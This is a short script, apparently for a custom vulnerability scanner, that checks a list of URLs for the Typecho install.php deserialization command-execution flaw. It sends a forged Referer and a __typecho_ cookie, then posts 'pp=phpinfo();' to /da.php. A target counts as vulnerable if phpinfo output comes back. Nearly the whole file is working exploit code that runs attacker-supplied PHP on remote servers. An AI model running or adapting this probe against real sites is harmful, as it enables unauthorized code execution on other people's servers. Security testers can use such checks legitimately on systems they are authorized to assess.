#request urls = array
#define payload = /da.php
#define bug = Configuration File (php.ini) Path
#define info = 存在typecho install.php反序列化命令执行漏洞
#define post = pp=phpinfo();
function main(args)
{
	printclolor("当前正在检测:".info,1);
	i = 0;
	num = GetArrayNum(urls);
	while(i<num){
		url = urls[i];
		try{
			header = "Referer: ".url."/install.php".StrRN()."Cookie: __typecho_".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0";
			HttpGet(url,header);
			res = HttpPost(url.payload,post,header);
			if(StrFindStr(res[0],bug,0)!= "-1")
			{
				printclolor("[+]".urls[i].info,3);
			}
		}catch{
		}
		i = ToInt(i+1);
	}
}
